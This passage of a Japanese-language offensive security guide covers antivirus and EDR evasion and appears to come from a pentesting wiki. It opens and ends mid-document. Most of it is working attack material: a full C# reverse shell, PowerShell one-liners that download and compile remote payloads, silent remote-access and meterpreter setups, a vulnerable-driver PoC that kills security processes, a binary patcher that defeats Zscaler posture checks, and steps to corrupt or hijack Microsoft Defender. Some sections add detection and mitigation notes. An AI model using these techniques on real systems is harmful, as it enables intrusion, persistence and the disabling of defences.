Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
これは、[PackMyPayload](https://github.com/mgeeky/PackMyPayload/) を使用してISOファイル内にpayloadsをパッケージ化し、SmartScreenをbypassするデモです。

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows（ETW）は、Windowsにおける強力なlogging mechanismであり、アプリケーションやsystem componentsが**eventsをlog**できます。ただし、security productsがmalicious activitiesをmonitorおよびdetectするためにも使用できます。

AMSIをdisabled（bypassed）にする方法と同様に、user space processの**`EtwEventWrite`** functionを、eventsをlogせずに即座にreturnするようにすることも可能です。これは、memory内のfunctionをpatchして即座にreturnさせることで実行され、そのprocessにおけるETW loggingを実質的にdisabledにします。

詳しい情報は **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) と [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** にあります。


## C# Assembly Reflection

C# binariesをmemory内にloadする手法はかなり以前から知られており、AVに捕捉されずにpost-exploitation toolsを実行するための非常に優れた方法です。

payloadはdiskに触れることなく直接memoryにloadされるため、process全体でAMSIをpatchすることだけを考慮すれば済みます。

ほとんどのC2 frameworks（sliver、Covenant、metasploit、CobaltStrike、Havocなど）は、C# assembliesをmemory内で直接executeする機能をすでに提供していますが、その方法にはいくつかの種類があります。

- **Fork\&Run**

これは、**新しい sacrificial processをspawn**し、その新しいprocessにpost-exploitation malicious codeをinjectしてmalicious codeをexecuteし、完了後に新しいprocessをkillする方法です。この方法にはメリットとデメリットの両方があります。fork and run methodのメリットは、executionがBeacon implant processの**外部で**行われることです。つまり、post-exploitation actionで何か問題が発生したり、捕捉されたりしても、**implantが生き残る可能性がはるかに高くなります。**デメリットは、**Behavioural Detections**によって捕捉される**可能性が高くなる**ことです。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

これは、post-exploitation malicious codeを**自身のprocessにinjectする**方法です。これにより、新しいprocessを作成してAVにscanされることを回避できますが、payloadのexecutionで何か問題が発生するとcrashする可能性があるため、**beaconを失う****可能性がはるかに高くなる**というデメリットがあります。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly loadingについて詳しく知りたい場合は、この記事 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) と、InlineExecute-Assembly BOF（[https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)）を確認してください。

**PowerShellから**C# Assembliesをloadすることもできます。[Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) と [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk) を確認してください。

## Using Other Programming Languages

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) で提案されているように、**Attacker Controlled SMB shareにinstallされたinterpreter environmentへのaccess**をcompromised machineに与えることで、他のlanguagesを使用してmalicious codeをexecuteできます。

SMB share上のInterpreter Binariesとenvironmentへのaccessを許可することで、compromised machineの**memory内でこれらのlanguagesのarbitrary codeをexecute**できます。

repoによると、Defenderは引き続きscriptsをscanしますが、Go、Java、PHPなどを利用することで、**static signaturesをbypassする柔軟性が高まります**。これらのlanguagesでrandomなun-obfuscated reverse shell scriptsを使用したtestingでは、成功することが確認されています。

## TokenStomping

Token stompingは、attackerが**access tokenやEDR、AVなどのsecurity productをmanipulate**し、privilegesを低下させることで、processがdieしないようにしつつ、malicious activitiesをcheckするpermissionsを持たせないようにするtechniqueです。

これを防ぐために、Windowsは**external processesがsecurity processesのtokensに対するhandlesを取得することを**preventできます。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

[**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)で説明されているように、victimのPCにChrome Remote Desktopをdeployし、それを使用してtakeoverおよびpersistenceの維持を行うのは簡単です。

1. https://remotedesktop.google.com/ からdownloadし、「Set up via SSH」をクリックしてから、Windows用のMSI fileをクリックしてMSI fileをdownloadします。
2. victim上でinstallerをsilentlyにrunします（adminが必要です）：`msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop pageに戻り、nextをクリックします。wizardからauthorizeを求められるので、Authorize buttonをクリックして続行します。
4. 指定されたparameterをいくつか調整してexecuteします：`"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111`（GUIを使用せずにpinをsetできる`pin` paramに注意してください。）


## Advanced Evasion

Evasionは非常に複雑なtopicです。1つのsystemだけでも、多くの異なるtelemetry sourcesを考慮しなければならない場合があるため、成熟したenvironmentsで完全にundetectedであり続けることはほぼ不可能です。

対抗するすべてのenvironmentには、それぞれ独自のstrengthsとweaknessesがあります。

よりAdvanced Evasion techniquesの足がかりを得るために、[@ATTL4S](https://twitter.com/DaniLJ94)によるこのtalkをぜひ視聴することを強く推奨します。


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

これも、[@mariuszbit](https://twitter.com/mariuszbit)によるEvasion in Depthについての素晴らしいtalkです。


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)を使用すると、**Defenderがmaliciousと判定している部分を見つけて分離するまで、binaryの一部を**removeできます。\
**同じことを行う別のtoolは**[**avred**](https://github.com/dobin/avred)で、[**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)でこのserviceを提供するopen webもあります。

### **Telnet Server**

Windows10までは、すべてのWindowsに**Telnet server**が付属しており、次のコマンドを実行することで（administratorとして）installできました。
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
システムの起動時に**開始**し、今すぐ実行します:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet portの変更**（stealth）とfirewallの無効化:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

以下からダウンロードします: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html)（setup ではなく、bin downloads を使用します）

**ホスト上で**: _**winvnc.exe**_ を実行し、server を設定します:

- _Disable TrayIcon_ オプションを有効にする
- _VNC Password_ にパスワードを設定する
- _View-Only Password_ にパスワードを設定する

その後、binary _**winvnc.exe**_ と**新たに**作成されたファイル _**UltraVNC.ini**_ を**victim**内に移動します

#### **Reverse connection**

**attacker** は自身の**ホスト内で** binary `vncviewer.exe -listen 5900` を実行し、reverse **VNC connection** を受け取れる状態にします。次に、**victim** 内で: winvnc daemon `winvnc.exe -run` を開始し、`winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` を実行します

**WARNING:** stealth を維持するには、いくつかの操作を行ってはいけません

- すでに実行中の場合は `winvnc` を起動しないでください。起動すると [ポップアップ](https://i.imgur.com/1SROTTl.png) が表示されます。`tasklist | findstr winvnc` で実行中か確認します
- 同じ directory に `UltraVNC.ini` がない状態で `winvnc` を起動しないでください。起動すると [config window](https://i.imgur.com/rfMQWcf.png) が開きます
- help を表示するために `winvnc -h` を実行しないでください。実行すると [ポップアップ](https://i.imgur.com/oc18wcu.png) が表示されます

### GreatSCT

以下からダウンロードします: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT の内部:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
ここで `msfconsole -r file.rc` を使って **lister** を**起動**し、次のコマンドで **xml payload** を**実行**します。
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**現在のdefenderはプロセスを非常に速くterminateします。**

### 独自のreverse shellのコンパイル

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 最初のC# Revershell

以下のコマンドでコンパイルします：
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
使用方法:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# コンパイラを使用する
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自動ダウンロードと実行:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators の一覧: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### injectorをbuildするためのpythonの使用例:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### その他のtools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### その他

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) - Kernel Space から AV/EDR を停止する

Storm-2603 は、ransomware を投下する前に endpoint protections を無効化するため、**Antivirus Terminator** と呼ばれる小型の console utility を利用した。この tool は**脆弱だが *signed* な driver を独自に持ち込み、それを悪用して、Protected-Process-Light (PPL) AV services でさえ block できない privileged kernel operations を発行する。

主なポイント
1. **Signed driver**: disk に配置される file は `ServiceMouse.sys` だが、binary は Antiy Labs の「System In-Depth Analysis Toolkit」に含まれる、正規に signed された driver `AToolsKrnl64.sys` である。この driver は有効な Microsoft signature を持つため、Driver-Signature-Enforcement (DSE) が有効でも load される。
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
1 行目は driver を**kernel service**として登録し、2 行目はそれを start する。これにより、user land から `\\.\ServiceMouse` にアクセスできるようになる。
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID によって任意の process を terminate する（Defender/EDR services の kill に使用） |
| `0x990000D0` | disk 上の任意の file を delete する |
| `0x990001D0` | driver を unload し、service を remove する |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD は user-mode protections を完全に skip する。kernel で実行される code は、PPL/PP、ELAM、その他の hardening features に関係なく、*protected* processes を open し、terminate したり、kernel objects を tamper したりできる。

Detection / Mitigation
•  Microsoft の vulnerable-driver block list (`HVCI`、`Smart App Control`) を有効にし、Windows が `AToolsKrnl64.sys` を load しないようにする。
• 新しい *kernel* services の creation を monitor し、driver が world-writable directory から load された場合、または allow-list に存在しない場合に alert を出す。
• custom device objects への user-mode handles と、それに続く suspicious な `DeviceIoControl` calls を監視する。

### On-Disk Binary Patching による Zscaler Client Connector Posture Checks の bypass

Zscaler の **Client Connector** は device-posture rules を local で適用し、結果を他の components に伝達するために Windows RPC に依存している。2 つの弱い design choices により、完全な bypass が可能になる。

1. Posture evaluation は**完全に client-side**で行われる（server には boolean が送信される）。
2. Internal RPC endpoints は、接続する executable が **Zscaler によって signed されている**こと（`WinVerifyTrust` 経由）だけを validate する。

disk 上の 4 つの signed binaries を**patch**することで、両方の mechanisms を neutralise できる。

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 常に `1` を return するため、すべての check が compliant になる |
| `ZSAService.exe` | `WinVerifyTrust` への indirect call | NOP-ed ⇒ あらゆる（unsigned のものも含む）process が RPC pipes に bind できる |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` に replace される |
| `ZSATunnel.exe` | tunnel 上の integrity checks | Short-circuited |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
元のファイルを置き換えて service stack を再起動した後:

* **すべての** posture checks が **green/compliant** を表示する。
* 署名されていない、または変更されたバイナリが、名前付きパイプ RPC endpoint（例: `\\RPC Control\\ZSATrayManager_talk_to_me`）を開ける。
* 侵害されたホストが、Zscaler policies で定義された内部 network に無制限でアクセスできる。

この case study は、純粋に client-side で行われる trust decisions と単純な signature checks が、数バイトの patch だけで突破できることを示している。

## LOLBINs を使用して Protected Process Light (PPL) を悪用し、AV/EDR を改変する

Protected Process Light (PPL) は signer/level hierarchy を適用し、同等以上の protected processes だけが相互に tamper できるようにする。攻撃者側では、PPL-enabled binary を正規に起動し、その arguments を制御できる場合、無害な機能（例: logging）を、AV/EDR が使用する protected directories に対する、制約付きの PPL-backed write primitive に変換できる。

What makes a process run as PPL
- 対象の EXE（およびロードされるすべての DLL）は、PPL-capable EKU で署名されている必要がある。
- process は、次の flags を指定した CreateProcess を使用して作成する必要がある: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`
- バイナリの signer に一致する compatible protection level を要求する必要がある（例: anti-malware signers には `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`、Windows signers には `PROTECTION_LEVEL_WINDOWS`）。誤った levels では creation に失敗する。

PP/PPL と LSASS protection の概要については、こちらも参照:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL（protection level を選択し、arguments を対象の EXE に forward する）:
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- 署名済みシステムバイナリ `C:\Windows\System32\ClipUp.exe` は自らを spawn し、caller が指定したパスに log file を書き込むための parameter を受け付ける。
- PPL process として起動すると、file write は PPL backing で実行される。
- ClipUp は spaces を含む paths を parse できないため、通常は保護されている locations を指定するには 8.3 short paths を使用する。

8.3 short path helpers
- short names を一覧表示する: 各 parent directory で `dir /x` を実行する。
- cmd で short path を導出する: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) launcher（例: CreateProcessAsPPL）を使用し、`CREATE_PROTECTED_PROCESS` で PPL 対応 LOLBIN（ClipUp）を起動する。
2) ClipUp の log-path argument を渡し、保護された AV directory（例: Defender Platform）に file creation を強制する。必要に応じて 8.3 short names を使用する。
3) target binary が実行中に AV によって通常 open/locked されている場合（例: MsMpEng.exe）、AV の起動前に boot 時点で write を実行するよう、より早い段階で確実に実行される auto-start service を install して write を schedule する。Process Monitor（boot logging）で boot ordering を検証する。
4) reboot 時に、PPL-backed write が AV による binaries の lock より前に実行され、target file が corrupt して startup が妨げられる。

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- ClipUp が書き込む内容を placement 以外で制御することはできません。この primitive は、正確な content injection よりも corruption に適しています。
- service の install/start と reboot window には local admin/SYSTEM が必要です。
- Timing が重要です。target は open になっていてはいけません。boot-time execution により file lock を回避できます。

Detections
- `ClipUp.exe` の process creation を、特に non-standard launcher が parent になっている場合や、boot 前後の unusual arguments とともに検知します。
- suspicious binary を auto-start するよう設定された新規 service、および Defender/AV より前に一貫して起動する service。Defender の startup failure より前に行われた service creation/modification を調査します。
- Defender binary/Platform directory の file integrity monitoring。protected-process flag を持つ process による予期しない file creation/modification を確認します。
- ETW/EDR telemetry: `CREATE_PROTECTED_PROCESS` で作成された process と、non-AV binary による anomalous PPL level usage を探します。

Mitigations
- WDAC/Code Integrity: PPL として実行できる signed binary、およびその parent を制限します。legitimate context 以外での ClipUp invocation を block します。
- Service hygiene: auto-start service の creation/modification を制限し、start-order manipulation を monitor します。
- Defender tamper protection と early-launch protections が有効であることを確認します。binary corruption を示す startup error を調査します。
- 環境との互換性がある場合は、security tooling を配置する volume での 8.3 short-name generation の無効化を検討します（十分に test してください）。

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Platform Version Folder Symlink Hijack による Microsoft Defender の Tampering

Windows Defender は、以下の配下にある subfolder を列挙して、実行する platform を選択します。
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

最も高い lexicographic version string（例: `4.18.25070.5-0`）を持つ subfolder を選択し、そこから Defender service process を起動します（service/registry path もそれに応じて更新されます）。この選択では directory reparse point（symlink を含む）を含む directory entry が信頼されます。administrator はこれを利用して Defender を attacker-writable path に redirect し、DLL sideloading または service disruption を実現できます。

Preconditions
- Local Administrator（Platform folder 配下に directory/symlink を作成するために必要）
- reboot、または Defender platform re-selection を trigger する能力（boot 時の service restart）
- built-in tool のみ必要（mklink）

Why it works
- Defender は自身の folder への write を block しますが、platform selection は directory entry を信頼し、target が protected/trusted path に resolve されることを validation せずに、lexicographically highest version を選択します。

Step-by-step (example)
1) 現在の platform folder の writable clone を準備します。例: `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform 内に、自分のフォルダを指す、より高いバージョンのディレクトリシンボリックリンクを作成します。
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) トリガーの選択（再起動を推奨）:
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend) がリダイレクトされたパスから実行されていることを確認する:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
`C:\TMP\AV\` 配下の新しい process path と、その場所を反映した service configuration/registry を確認します。

Post-exploitation options
- DLL sideloading/code execution: Defender が application directory から load する DLL を drop/replace し、Defender の process 内で code を実行します。上記のセクション [DLL Sideloading & Proxying](#dll-sideloading--proxying) を参照してください。
- Service kill/denial: version-symlink を削除します。次回の start 時に configured path が resolve されなくなり、Defender の start に失敗します。
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> この technique はそれ自体では privilege escalation を提供しない点に注意してください。admin rights が必要です。

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams は、runtime evasion を C2 implant から対象 module 自体へ移し、その Import Address Table (IAT) を hooking して、選択した API を attacker-controlled な position-independent code (PIC) 経由で呼び出せます。これにより、多くの kit が公開する小規模な API surface（例: CreateProcessA）を超えて evasion を一般化し、同じ protections を BOFs や post-exploitation DLLs にも適用できます。

高レベルのアプローチ
- reflective loader を使用して、target module とともに PIC blob を stage します（prepend または companion）。PIC は self-contained かつ position-independent でなければなりません。
- host DLL の load 時に、その IMAGE_IMPORT_DESCRIPTOR を走査し、対象 import（例: CreateProcessA/W、CreateThread、LoadLibraryA/W、VirtualAlloc）の IAT entries を、薄い PIC wrappers を指すよう patch します。
- 各 PIC wrapper は、real API address に tail-call する前に evasion を実行します。一般的な evasion には次のものがあります。
- call の前後における memory mask/unmask（例: beacon regions の encrypt、RWX→RX、page names/permissions の変更）を行い、call 後に restore します。
- Call-stack spoofing: benign な stack を構築し、target API へ transition することで、call-stack analysis が想定された frames を解決するようにします。
- compatibility のため、Aggressor script（または equivalent）が Beacon、BOFs、post-ex DLLs に対して hook する API を register できる interface を export します。

この場合に IAT hooking を使用する理由
- hooked import を使用するあらゆる code に対して機能し、tool code を変更したり、特定の API を proxy するために Beacon に依存したりする必要がありません。
- post-ex DLLs をカバーします。LoadLibrary* を hooking することで module loads（例: System.Management.Automation.dll、clr.dll）を intercept し、それらの API calls に同じ masking/stack evasion を適用できます。
- CreateProcessA/W を wrapping することで、call-stack-based detections に対して process-spawning post-ex commands を確実に使用できるようにします。

最小限の IAT hook sketch（x64 C/C++ pseudocode）
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- relocations/ASLR の後、import を初めて使用する前に patch を適用する。TitanLdr/AceLdr のような Reflective loader は、ロードされた module の DllMain 中に hooking を行う例を示している。
- wrapper は小さく、PIC-safe に保つ。patch 前に取得した元の IAT 値、または LdrGetProcedureAddress を介して真の API を解決する。
- PIC では RW → RX の遷移を使用し、writable+executable のページを残さない。

Call‑stack spoofing stub
- Draugr-style の PIC stub は、benign module 内の return address で fake call chain を構築し、その後 real API へ pivot する。
- これにより、Beacon/BOFs から sensitive API への canonical stack を想定する検知を回避する。
- stack cutting/stack stitching technique と組み合わせ、API prologue の前に想定される frame 内へ到達させる。

Operational integration
- Reflective loader を post‑ex DLL の先頭に付加し、DLL のロード時に PIC と hooks が自動的に初期化されるようにする。
- Aggressor script を使用して target API を登録し、コード変更なしで Beacon と BOFs が同じ evasion path の恩恵を透過的に受けられるようにする。

Detection/DFIR considerations
- IAT integrity: non‑image（heap/anon）address に解決される entry、および import pointer の定期的な検証。
- Stack anomalies: loaded image に属さない return address、non‑image PIC への急激な遷移、RtlUserThreadStart の ancestry の不整合。
- Loader telemetry: process 内からの IAT への書き込み、import thunk を変更する早期の DllMain activity、load 時に作成される予期しない RX region。
- Image‑load evasion: hooking LoadLibrary* を行う場合、memory masking event と相関する automation/clr assembly の不審な load を監視する。

Related building blocks and examples
- load 中に IAT patching を実行する Reflective loader（例: TitanLdr、AceLdr）
- Memory masking hooks（例: simplehook）および stack‑cutting PIC（stackcutting）
- PIC call‑stack spoofing stub（例: Draugr）


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Reflective loader を制御できる場合、custom resolver で loader の `GetProcAddress` pointer を置き換え、先に hooks を確認することで、`ProcessImports()` **中に** imports を hook できる。

- transient loader PIC が自身を free した後も存続する **resident PICO**（persistent PIC object）を構築する。
- `setup_hooks()` function を export し、loader の import resolver を上書きする（例: `funcs.GetProcAddress = _GetProcAddress`）。
- `_GetProcAddress` では ordinal import をスキップし、`__resolve_hook(ror13hash(name))` のような hash-based hook lookup を使用する。hook が存在する場合はそれを返し、それ以外の場合は real `GetProcAddress` に委譲する。
- Crystal Palace の `addhook "MODULE$Func" "hook"` entry を link time に使用して hook target を登録する。hook は resident PICO 内に存在するため有効なままとなる。

これにより、load 後に loaded DLL の code section を patch せずに **import-time IAT redirection** が可能になる。

### Forcing hookable imports when the target uses PEB-walking

